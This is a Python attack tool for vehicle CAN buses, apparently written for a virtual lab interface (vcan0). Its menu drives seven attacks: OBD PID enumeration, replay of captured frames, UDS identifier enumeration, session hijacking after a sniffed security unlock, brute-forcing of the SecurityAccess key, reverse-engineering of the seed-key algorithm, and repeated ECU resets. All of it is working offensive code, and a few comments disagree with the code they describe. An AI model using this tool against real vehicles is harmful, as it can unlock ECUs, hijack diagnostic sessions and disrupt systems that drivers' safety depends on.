#!/usr/bin/env python3
"""
Simple CAN Bus OBD/UDS Attack Tool with ISO-TP
vcan0, TX: 0x7E0, RX: 0x7E8
"""

import isotp
import can
import time
import sys

# ============================================================
# Global Configuration
# ============================================================

CHANNEL = 'vcan0'
TX_ID = 0x7E0
RX_ID = 0x7E8

# Initialize CAN bus with filters
bus = can.interface.Bus(
    CHANNEL,
    interface='socketcan',
    can_filters=[
        {"can_id": TX_ID, "can_mask": 0x7FF},
        {"can_id": RX_ID, "can_mask": 0x7FF}
    ]
)

# Initialize ISO-TP stack
addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=TX_ID, rxid=RX_ID)
stack = isotp.CanStack(bus=bus, address=addr)

# ============================================================
# Helper Functions
# ============================================================

def send_isotp(data):
    """Send data via ISO-TP protocol"""
    try:
        stack.send(bytes(data))
        # Process until transmission complete
        while stack.transmitting():
            stack.process()
            time.sleep(0.001)
        return True
    except Exception as e:
        print(f"[-] Send error: {e}")
        return False

def recv_isotp(timeout=1.0):
    """Receive data via ISO-TP protocol"""
    end_time = time.time() + timeout
    
    while time.time() < end_time:
        stack.process()
        
        if stack.available():
            data = stack.recv()
            if data is not None:
                return list(data)
        
        time.sleep(0.001)
    
    return None

def clear_isotp_buffer():
    """Clear ISO-TP receive buffer"""
    stack.process()
    while stack.available():
        stack.recv()

# ============================================================
# OBD Attack 1: PID Enumeration
# ============================================================

def obd_pid_enumeration():
    """Scan for available OBD PIDs (Service 0x01)"""
    print("\n" + "="*50)
    print("OBD PID Enumeration")
    print("="*50)
    print("[*] Scanning PIDs 0x00 to 0xFF...")
    
    found = []
    
    for pid in range(0x00, 0x100):
        clear_isotp_buffer()
        
        # Send OBD request: Service 0x01 + PID
        send_isotp([0x01, pid])
        
        # Wait for response
        resp = recv_isotp(timeout=0.3)
        
        if resp:
            # Check positive response (0x41 = 0x01 + 0x40)
            if  resp[2] != 0x31:
                found.append(pid)
                print(f"  [+] PID 0x{pid:02X} found - Data: {' '.join(f'{b:02X}' for b in resp)}")
        
        time.sleep(0.05)
    
    print(f"\n[+] Total PIDs found: {len(found)}")
    return found

# ============================================================
# OBD Attack 2: Replay Attack
# ============================================================

def obd_replay_attack():
    """Capture and replay CAN messages"""
    print("\n" + "="*50)
    print("OBD Replay Attack")
    print("="*50)
    
    # Phase 1: Capture
    print("[*] Capturing messages for 10 seconds...")
    captured = []
    start = time.time()
    
    while time.time() - start < 10:
        msg = bus.recv(timeout=0.1)
        if msg and msg.arbitration_id in [TX_ID, RX_ID]:
            captured.append(msg)
            print(f"  [RX] ID=0x{msg.arbitration_id:X} Data: {' '.join(f'{b:02X}' for b in msg.data)}")
    
    print(f"\n[+] Captured {len(captured)} messages")
    
    # Phase 2: Replay
    if captured:
        print("\n[*] Replaying captured messages...")
        for msg in captured:
            try:
                bus.send(msg)
                print(f"  [TX] Replayed: {' '.join(f'{b:02X}' for b in msg.data)}")
                time.sleep(0.1)
            except Exception as e:
                print(f"  [-] Replay error: {e}")
    else:
        print("[-] No messages to replay")
    
    return captured

# ============================================================
# UDS Attack 3: DID/RID Enumeration
# ============================================================

def uds_did_rid_enum():
    """Enumerate DIDs and RIDs across different sessions"""
    print("\n" + "="*50)
    print("UDS DID/RID Enumeration")
    print("="*50)
    
    sessions = {
        'Default': 0x01,
        'Programming': 0x02,
        'Extended': 0x03
    }
    
    results = {}
    
    for session_name, session_id in sessions.items():
        print(f"\n[*] Testing {session_name} Session (0x{session_id:02X})...")
        results[session_name] = {'DIDs': [], 'RIDs': []}
        
        # Enter diagnostic session
        clear_isotp_buffer()
        send_isotp([0x10, session_id])
        resp = recv_isotp(timeout=0.5)
        
        if resp and len(resp) >= 1 and resp[0] == 0x50:
            print(f"  [+] Entered {session_name} session")
        else:
            print(f"  [-] Failed to enter {session_name} session")
            #continue
        

        # Scan DIDs (ReadDataByIdentifier - 0x22)
        print("  [*] Scanning DIDs 0xF180-0xF19F...")
        for did in range(0xF180, 0xF1A0+1):
            clear_isotp_buffer()
            send_isotp([0x22, (did >> 8) & 0xFF, did & 0xFF])
            
            resp = recv_isotp(timeout=0.2)
            if resp and resp[-1] != 0x31:
                results[session_name]['DIDs'].append(did)
                print(f"    [+] DID 0x{did:04X} accessible")
            
            time.sleep(0.001)
        
        # Scan RIDs (RoutineControl - 0x31)
        print("  [*] Scanning RIDs 0x1150-0x1310...")
        for rid in range(0x1150, 0x1310+1):
            clear_isotp_buffer()
            send_isotp([0x31, 0x01, (rid >> 8) & 0xFF, rid & 0xFF])
            
            resp = recv_isotp(timeout=0.2)
            if resp and resp[-1] != 0x31:
                results[session_name]['RIDs'].append(rid)
                print(f"    [+] RID 0x{rid:04X} accessible")
            
            time.sleep(0.001)
    
    # Summary
    print("\n" + "="*50)
    print("Summary")
    print("="*50)
    for session, items in results.items():
        print(f"{session}: {len(items['DIDs'])} DIDs, {len(items['RIDs'])} RIDs")
    
    return results


# ============================================================
# UDS Attack 4: MITM Session Hijacking
# ============================================================

def uds_mitm_hijack():
    """Listen for seed-key exchange and hijack session"""
    print("\n" + "="*50)
    print("UDS MITM Session Hijacking")
    print("="*50)
    print("[*] Listening for SecurityAccess seed-key exchange...")
    print("[*] Timeout: 60 seconds\n")
    
    unlocked = False
    start = time.time()
    
    # Listen for successful SecurityAccess
    while time.time() - start < 60 and not unlocked:
        msg = bus.recv(timeout=0.1)
        
        if msg and msg.arbitration_id == RX_ID:
            # Parse ISO-TP frame
            data = list(msg.data)
            
            # Single frame (length in first nibble)
            if (data[0] & 0xF0) == 0x00:
                length = data[0] & 0x0F
                payload = data[1:1+length]
            # First frame or consecutive frame - process via stack
            else:
                stack.process()
                if stack.available():
                    payload = list(stack.recv())
                else:
                    continue
            
            # Check for SecurityAccess (0x27)
            if len(payload) >= 2 and payload[0] == 0x27:
                if payload[1] % 2 == 1:  # RequestSeed (odd)
                    print(f"  [SNIFF] RequestSeed: {' '.join(f'{b:02X}' for b in payload)}")
                else:  # SendKey (even)
                    print(f"  [SNIFF] SendKey: {' '.join(f'{b:02X}' for b in payload)}")
            
            # Check for positive SecurityAccess response (0x67)
            if len(payload) >= 1 and payload[0] == 0x67  and payload[1] == 0x02:
                print(f"  [!!!] ECU UNLOCKED! Response: {' '.join(f'{b:02X}' for b in payload)}")
                unlocked = True
                break
    
    if not unlocked:
        print("\n[-] No successful SecurityAccess detected")
        return False
    
    # Hijack the session
    print("\n[+] Attempting session hijack...")
    
    # Enter Extended Session
    clear_isotp_buffer()
    send_isotp([0x10, 0x03])
    resp = recv_isotp(timeout=0.5)
    
    if resp and len(resp) >= 1 and resp[0] == 0x50:
        print("  [+] Extended Session active!")
        
        # Keep session alive
        print("\n[*] Sending TesterPresent (Ctrl+C to stop)...\n")
        
        try:
            count = 0
            while True:
                send_isotp([0x3E, 0x80])
                count += 1
                print(f"  [<3] TesterPresent #{count}")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[*] Stopped")
            return True
    else:
        print("  [-] Failed to enter Extended Session")
        return False

# ============================================================
# UDS Attack 3: Security Access Brute-Force
# ============================================================

def uds_security_bruteforce():
    """Brute-force SecurityAccess seed-key"""
    print("\n" + "="*50)
    print("UDS Security Access Brute-Force")
    print("="*50)
    
    # Request seed
    print("[*] Requesting seed...")
    clear_isotp_buffer()
    send_isotp([0x27, 0x01])
    
    resp = recv_isotp(timeout=1.0)
    if not resp:
        print("[-] No response")
        return None
    
    # Check positive response (0x67)
    if len(resp) < 2 or resp[0] != 0x67:
        print(f"[-] Negative response: {' '.join(f'{b:02X}' for b in resp)}")
        return None
    
    # Extract seed
    seed = resp[2:]
    print(f"[+] Seed: {' '.join(f'{b:02X}' for b in seed)}")
    
    # Brute-force
    print("\n[*] Brute-forcing (trying 1000 keys)...\n")
    
    for attempt in range(0x333344,0x333BAC):
        # Simple algorithm: XOR with attempt value
        key_int =  attempt
        key = key_int.to_bytes(4, 'big')
        # Send key
        clear_isotp_buffer()
        cmd = b'\x27\x02' + key
        send_isotp(cmd)
        
        resp = recv_isotp(timeout=0.5)
        
        if resp:
            # Positive response (0x67)
            if len(resp) >= 1 and resp[0] == 0x67:
                print(f"\n[SUCCESS] Key found!")
                print(f"  Seed: {' '.join(f'{b:02X}' for b in seed)}")
                print(f"  Key:  {' '.join(f'{b:02X}' for b in key)}")
               
                return key
            
            # Negative response
            elif resp[0] == 0x7F:
                if len(resp) >= 3 and resp[2] == 0x36:  # ExceededNumberOfAttempts
                    print(f"\n[-] Locked out after {attempt} attempts")
                    return None
        
        
            print(f"  [*] Tested {attempt}")
        
        time.sleep(0.001)
    
    print("\n[-] Key not found")
    return None

# ============================================================
# UDS Attack 6: Seed-Key Algorithm Reverse Engineering
# ============================================================
def uds_algorithm_reverse_engineering():
    """Capture seed-key pairs and reverse engineer the algorithm"""
    print("\n" + "="*50)
    print("UDS Seed-Key Algorithm Reverse Engineering")
    print("="*50)
    print("[*] Listening for seed-key exchanges on CAN bus...")
    print("[*] Need to capture 2 seed-key pairs")
    print("[*] Timeout: 60 seconds\n")
    
    seed_key_pairs = []
    start = time.time()
    current_seed = None
    
    # Phase 1: Capture seed-key pairs
    while time.time() - start < 60 and len(seed_key_pairs) < 2:
        msg = bus.recv(timeout=0.1)
        
        if msg and msg.arbitration_id == RX_ID:
            data = list(msg.data)
            
            # Single frame
            if (data[0] & 0xF0) == 0x00:
                length = data[0] & 0x0F
                payload = data[1:1+length]
            else:
                stack.process()
                if stack.available():
                    payload = list(stack.recv())
                else:
                    continue
            
            # Capture seed (positive response to RequestSeed - 0x67)
            if len(payload) >= 2 and payload[0] == 0x67 and payload[1] == 0x01:
                current_seed = payload[2:]
                print(f"  [SNIFF] Seed #{len(seed_key_pairs)+1}: {' '.join(f'{b:02X}' for b in current_seed)}")
        
        # Listen for SendKey on TX channel
        if msg and msg.arbitration_id == TX_ID:
            data = list(msg.data)
            
            if (data[0] & 0xF0) == 0x00:
                length = data[0] & 0x0F
                payload = data[1:1+length]
            else:
                continue
            
            # Capture key (SendKey - 0x27 with even sub-function)
            if len(payload) >= 2 and payload[0] == 0x27 and payload[1] == 0x02:
                if current_seed is not None:
                    key = payload[2:]
                    seed_key_pairs.append({'seed': current_seed, 'key': key})
                    print(f"  [SNIFF] Key #{len(seed_key_pairs)}: {' '.join(f'{b:02X}' for b in key)}")
                    print(f"  [+] Pair #{len(seed_key_pairs)} captured\n")
                    current_seed = None
    
    if len(seed_key_pairs) < 2:
        print(f"\n[-] Only captured {len(seed_key_pairs)} pairs, need 2")
        return None
    
    print("\n[+] Successfully captured 2 seed-key pairs!")
    print("\n" + "="*50)
    print("Captured Pairs:")
    print("="*50)
    for i, pair in enumerate(seed_key_pairs, 1):
        print(f"Pair {i}:")
        print(f"  Seed: {' '.join(f'{b:02X}' for b in pair['seed'])}")
        print(f"  Key:  {' '.join(f'{b:02X}' for b in pair['key'])}")
    
    # Phase 2: Reverse engineer algorithm
    print("\n" + "="*50)
    print("Reverse Engineering Algorithm...")
    print("="*50)
    
    # Detect seed size and calculate max constant value
    seed_size = len(seed_key_pairs[0]['seed'])
    max_constant = (1 << (seed_size * 8)) - 1  # 2^(bits) - 1
    
    print(f"[*] Detected seed size: {seed_size} bytes ({seed_size * 8}-bit)")
    print(f"[*] Maximum constant value: 0x{max_constant:0{seed_size*2}X}")
    
    # Convert seeds and keys to integers for comparison
    def bytes_to_int(data):
        """Convert byte array to integer (big-endian)"""
        result = 0
        for byte in data:
            result = (result << 8) | byte
        return result
    
    def int_to_bytes(value, size):
        """Convert integer to byte array (big-endian)"""
        return [(value >> (8 * (size - 1 - i))) & 0xFF for i in range(size)]
    
    seed1_int = bytes_to_int(seed_key_pairs[0]['seed'])
    key1_int = bytes_to_int(seed_key_pairs[0]['key'])
    seed2_int = bytes_to_int(seed_key_pairs[1]['seed'])
    key2_int = bytes_to_int(seed_key_pairs[1]['key'])
    
    # Suggest common ranges based on seed size
    suggested_ranges = {
        2: [  # 16-bit
            ("Small constant (0x0000-0x00FF)", 0x0000, 0x00FF),
            ("Medium constant (0x0000-0xFFFF)", 0x0000, 0xFFFF),
            ("Common automotive (0x1000-0x2000)", 0x1000, 0x2000),
        ],
        4: [  # 32-bit
            ("Small constant (0x00000000-0x000000FF)", 0x00000000, 0x000000FF),
            ("Medium constant (0x00000000-0x0000FFFF)", 0x00000000, 0x0000FFFF),
            ("Common automotive (0x11220000-0x11230000)", 0x11220000, 0x11230000),
            ("Large range (0x00000000-0x00FFFFFF)", 0x00000000, 0x00FFFFFF),
        ],
        8: [  # 64-bit
            ("Small constant (0x0000000000000000-0x00000000000000FF)", 0x0000000000000000, 0x00000000000000FF),
            ("Medium constant (0x0000000000000000-0x000000000000FFFF)", 0x0000000000000000, 0x000000000000FFFF),
        ]
    }
    
    # Get user input for range
    print("\n" + "="*50)
    print("Select Constant Range:")
    print("="*50)
    
    ranges = suggested_ranges.get(seed_size, [])
    if ranges:
        for i, (desc, start, end) in enumerate(ranges, 1):
            range_size = end - start + 1
            print(f"  {i}. {desc}")
            print(f"     Range: 0x{start:0{seed_size*2}X} - 0x{end:0{seed_size*2}X} ({range_size:,} attempts)")
    
    print(f"  {len(ranges)+1}. Custom range (enter manually)")
    print(f"  0. Cancel")
    
    while True:
        try:
            choice = input(f"\nSelect option [0-{len(ranges)+1}]: ").strip()
            choice_num = int(choice)
            
            if choice_num == 0:
                print("[-] Operation cancelled")
                return None
            elif 1 <= choice_num <= len(ranges):
                _, const_start, const_end = ranges[choice_num - 1]
                break
            elif choice_num == len(ranges) + 1:
                # Custom range
                print(f"\nEnter custom range (hex values without 0x prefix):")
                const_start_str = input(f"  Start (0-{max_constant:0{seed_size*2}X}): ").strip()
                const_end_str = input(f"  End   (0-{max_constant:0{seed_size*2}X}): ").strip()
                
                const_start = int(const_start_str, 16)
                const_end = int(const_end_str, 16)
                
                if const_start > const_end:
                    print("[-] Start must be <= End")
                    continue
                if const_end > max_constant:
                    print(f"[-] End exceeds maximum (0x{max_constant:0{seed_size*2}X})")
                    continue
                
                break
            else:
                print(f"[-] Invalid choice, enter 0-{len(ranges)+1}")
        except ValueError:
            print("[-] Invalid input, enter a number")
        except KeyboardInterrupt:
            print("\n[-] Operation cancelled")
            return None
    
    # Calculate total attempts
    total_attempts = const_end - const_start + 1
    print(f"\n[*] Testing range: 0x{const_start:0{seed_size*2}X} - 0x{const_end:0{seed_size*2}X}")
    print(f"[*] Total attempts: {total_attempts:,}")
    print("[*] Testing algorithms: XOR, ADD, SUB\n")
    
    operations = [
        ('XOR', lambda s, c, sz: (s ^ c) & ((1 << (sz * 8)) - 1)),
        ('ADD', lambda s, c, sz: (s + c) & ((1 << (sz * 8)) - 1)),
        ('SUB', lambda s, c, sz: (s - c) & ((1 << (sz * 8)) - 1)),
    ]
    
    found_algorithm = False
    start_time = time.time()
    last_update = start_time
    
    try:
        for const in range(const_start, const_end + 1):
            # Progress indicator every 1000 attempts or every 2 seconds
            if const % 1000 == 0 or (time.time() - last_update) >= 2:
                elapsed = time.time() - start_time
                progress = ((const - const_start) / total_attempts) * 100
                attempts_per_sec = (const - const_start) / elapsed if elapsed > 0 else 0
                eta = ((const_end - const + 1) / attempts_per_sec) if attempts_per_sec > 0 else 0
                
                print(f"  [*] Progress: {progress:.1f}% | Tested: {const - const_start:,}/{total_attempts:,} | "
                      f"Speed: {attempts_per_sec:.0f} att/s | ETA: {eta:.0f}s", end='\r')
                last_update = time.time()
            
            # Test each operation
            for op_name, op_func in operations:
                test_key1 = op_func(seed1_int, const, seed_size)
                test_key2 = op_func(seed2_int, const, seed_size)
                
                if test_key1 == key1_int and test_key2 == key2_int:
                    print(f"\n\n[SUCCESS] Algorithm found!")
                    print(f"  Operation: {op_name}")
                    print(f"  Constant: 0x{const:0{seed_size*2}X}")
                    
                    if op_name == 'XOR':
                        print(f"  Formula: Key = Seed XOR 0x{const:0{seed_size*2}X}")
                    elif op_name == 'ADD':
                        print(f"  Formula: Key = (Seed + 0x{const:0{seed_size*2}X}) & 0x{max_constant:0{seed_size*2}X}")
                    elif op_name == 'SUB':
                        print(f"  Formula: Key = (Seed - 0x{const:0{seed_size*2}X}) & 0x{max_constant:0{seed_size*2}X}")
                    
                    found_algorithm = True
                    
                    # Verify with a test
                    print("\n[*] Verifying algorithm...")
                    verify_result = verify_seed_key_algorithm(op_name, const, seed_size)
                    
                    return {
                        'operation': op_name,
                        'constant': const,
                        'seed_size': seed_size,
                        'verified': verify_result
                    }
    
    except KeyboardInterrupt:
        print("\n\n[-] Search interrupted by user")
        return None
    
    if not found_algorithm:
        print(f"\n\n[-] Algorithm not found in tested range")
        print("[*] The algorithm might be:")
        print("    - Using a different operation (ROL, ROR, MUL, etc.)")
        print("    - Using a constant outside the tested range")
        print("    - More complex (multiple operations, lookup tables, etc.)")
    
    return None


def verify_seed_key_algorithm(operation, constant, seed_size):
    """Verify the discovered algorithm by requesting a new seed and calculating key"""
    print("  [*] Requesting new seed from ECU...")
    
    clear_isotp_buffer()
    send_isotp([0x27, 0x01])
    
    resp = recv_isotp(timeout=1.0)
    if not resp or resp[0] != 0x67:
        print("  [-] Failed to get seed")
        return False
    
    seed = resp[2:]
    print(f"  [*] New Seed: {' '.join(f'{b:02X}' for b in seed)}")
    
    # Convert seed to integer
    seed_int = 0
    for byte in seed:
        seed_int = (seed_int << 8) | byte
    
    # Calculate key based on discovered algorithm
    max_val = (1 << (seed_size * 8)) - 1
    
    if operation == 'XOR':
        key_int = (seed_int ^ constant) & max_val
    elif operation == 'ADD':
        key_int = (seed_int + constant) & max_val
    elif operation == 'SUB':
        key_int = (seed_int - constant) & max_val
    else:
        print("  [-] Unknown operation")
        return False
    
    # Convert key integer back to bytes
    key = []
    for i in range(seed_size - 1, -1, -1):
        key.insert(0, (key_int >> (8 * i)) & 0xFF)
    
    print(f"  [*] Calculated Key: {' '.join(f'{b:02X}' for b in key)}")
    
    # Send key
    clear_isotp_buffer()
    send_isotp([0x27, 0x02] + key)
    
    resp = recv_isotp(timeout=1.0)
    if resp and resp[0] == 0x67:
        print("  [+] VERIFICATION SUCCESS! Algorithm is correct!")
        return True
    else:
        print("  [-] Verification failed")
        if resp:
            print(f"      Response: {' '.join(f'{b:02X}' for b in resp)}")
        return False
# ============================================================
# UDS Attack 7: ECU Reset Spamming
# ============================================================

def uds_ecu_reset_spam():
    """Spam ECU with reset requests"""
    print("\n" + "="*50)
    print("UDS ECU Reset Spamming")
    print("="*50)
    print("[*] Sending continuous resets (Ctrl+C to stop)...\n")
    
    resets = {
        0x01: 'hardReset',
        0x02: 'keyOffOnReset',
        0x03: 'softReset',
        0x04: 'enableRapidPowerShutDown',
        0x05: 'disableRapidPowerShutDown'
    }
    
    count = 0
    
    try:
        while True:
            for reset_id, reset_name in resets.items():
                clear_isotp_buffer()
                send_isotp([0x11, reset_id])
                
                resp = recv_isotp(timeout=0.3)
                
                if resp:
                    status = '[+]' if resp[0] == 0x51 else '[-]'
                else:
                    status = '[?]'
                
                count += 1
                print(f"  {status} Reset #{count}: {reset_name} (0x{reset_id:02X})")
                
                time.sleep(0.001)
    except KeyboardInterrupt:
        print(f"\n[*] Stopped after {count} attempts")

# ============================================================
# Main Menu
# ============================================================

def print_menu():
    """Display attack menu"""
    print("\n" + "="*60)
    print("CAN Bus Attack Tool - ISO-TP (vcan0)")
    print("="*60)
    print("\n[OBD Attacks]")
    print("  1. OBD PID Enumeration")
    print("  2. OBD Replay Attack")
    print("\n[UDS Attacks]")
    print("  3. UDS DID/RID Enumeration")
    print("  4. UDS MITM Session Hijacking")
    print("  5. UDS Security Access Brute-Force")
    print("  6. UDS Seed-Key Algorithm Reverse Engineering")
    print("  7. UDS ECU Reset Spamming")
    
    print("\n  0. Exit")
    print("="*60)

def main():
    """Main program loop"""
    print("CAN Bus OBD/UDS Attack Tool with ISO-TP")
    print("TX: 0x7E0, RX: 0x7E8\n")
    
    # Main loop
    while True:
        print_menu()
        
        try:
            choice = input("\nSelect attack [0-7]: ").strip()
        except KeyboardInterrupt:
            print("\n\n[*] Exiting...")
            break
        
        if choice == '0':
            print("\n[*] Goodbye!")
            break
        elif choice == '1':
            obd_pid_enumeration()
        elif choice == '2':
            obd_replay_attack()
        elif choice == '3':
            uds_did_rid_enum()
        elif choice == '4':
            uds_mitm_hijack()
        elif choice == '5':
            uds_security_bruteforce()
        elif choice == '6':
            uds_algorithm_reverse_engineering()
        elif choice == '7':
            uds_ecu_reset_spam()
        else:
            print("\n[-] Invalid choice!")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted")
    finally:
        if bus:
            bus.shutdown()
            print("[*] CAN bus closed")